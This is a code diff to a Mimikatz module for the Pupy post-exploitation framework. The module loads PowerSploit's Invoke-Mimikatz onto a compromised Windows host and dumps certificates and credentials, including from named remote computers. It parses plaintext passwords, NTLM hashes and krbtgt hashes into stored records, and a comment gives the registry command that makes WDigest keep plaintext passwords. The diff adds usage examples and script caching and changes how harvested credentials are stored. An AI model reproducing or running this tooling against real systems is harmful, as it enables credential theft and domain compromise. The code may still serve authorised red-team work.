@@ -15,16 +15,30 @@ class Mimikatz_Powershell(PupyModule):
     """
     
     def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="Mimikatz_Powershell", description=self.__doc__)
+
+        commands_available = '''
+Commandes available:\n
+Invoke-Mimikatz -DumpCerts
+Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
+'''
+        self.arg_parser = PupyArgumentParser(prog="Mimikatz_Powershell", description=self.__doc__, epilog=commands_available)
+        self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-Mimikatz', help='command not needed')
 
     def run(self, args):
         
         # check if windows 8.1 or Win2012 => reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 
-        content = open(os.path.join(ROOT, "external", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"), 'r').read()
-        function = 'Invoke-Mimikatz'
+        script ='mimikatz'
 
-        output = execute_powershell_script(self, content, function, x64IfPossible=True)
+        # check if file has been already uploaded to the target
+        for arch in ['x64', 'x86']:
+            if script not in self.client.powershell[arch]['scripts_loaded']:
+                content = open(os.path.join(ROOT, "external", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"), 'r').read()
+            else:
+                content = ''
+
+        output = execute_powershell_script(self, content, args.command, x64IfPossible=True, script_name=script)
         if not output:
             self.error("Error running mimikatz. Enough privilege ?")
             return
@@ -85,25 +99,40 @@ class Mimikatz_Powershell(PupyModule):
                     except:
                         pass
 
-                if username != "" and password != "" and password != "(null)":
-                    
-                    sid = ""
+                    if password:
+                        if username != "" and password != "" and password != "(null)":
+                            
+                            sid = ""
 
-                    # substitute the FQDN in if it matches
-                    if hostDomain.startswith(domain.lower()):
-                        domain = hostDomain
-                        sid = domainSid
+                            # substitute the FQDN in if it matches
+                            if hostDomain.startswith(domain.lower()):
+                                domain = hostDomain
+                                sid = domainSid
 
-                    if self.validate_ntlm(password):
-                        credType = "hash"
+                            store = False
+                            category = ''
+                            if self.validate_ntlm(password):
+                                credType = "Hash"
+                                category = 'NTLM hash'
+                                if not username.endswith("$"):
+                                    store = True
 
-                    else:
-                        credType = "password"
+                            else:
+                                credType = "Password"
+                                category = 'System password'
+                                # ignore big hex password
+                                if  len(password) < 300:
+                                    store = True
 
-                    # ignore machine account plaintexts
-                    if not (credType == "password" and username.endswith("$")):
-                        creds.append({'domain': domain, 'user': username, credType:password, 'hostName': hostName, 'sid':sid, 'Tool': 'mimikatz'})
-
+                            result = {'Domain': domain, 'Login': username, credType:password, 'CredType': credType.lower(), 'Host': hostName, 'sid':sid, 'Category': category, 'uid': self.client.short_name()}
+                            # do not store password if it has already been stored
+                            for c in creds:
+                                if c == result:
+                                    store = False
+                            if store:
+                                creds.append(result)
+                        username, domain, password = "", "", ""
+                        
         if len(creds) == 0:
             # check if we have lsadump output to check for krbtgt
             # happens on domain controller hashdumps
@@ -128,7 +157,7 @@ class Mimikatz_Powershell(PupyModule):
                                 break
 
                         if krbtgtHash != "":
-                            creds.append({'domain': domain, 'user': user, 'krbtgt hash': krbtgtHash, 'hostName': hostName, 'sid':sid, 'Tool': 'mimikatz'})
+                            creds.append({'Domain': domain, 'Login': user, 'Hash': krbtgtHash, 'Host': hostName, 'CredType': 'hash', 'sid':sid, 'Category': 'krbtgt hash', 'uid': self.client.short_name()})
                     except Exception as e:
                         pass
 
@@ -153,7 +182,7 @@ class Mimikatz_Powershell(PupyModule):
                         pass
 
                 if domain != "" and userHash != "":
-                    creds.append({'domain': domain, 'user': user, 'hash': userHash, 'dcName': dcName, 'sid':sid, 'Tool': 'mimikatz'})
+                    creds.append({'Domain': domain, 'Login': user, 'Hash': userHash, 'Host': dcName, 'CredType': 'hash', 'SID':sid, 'Category': 'NTLM hash', 'uid': self.client.short_name()})
 
         return creds
 
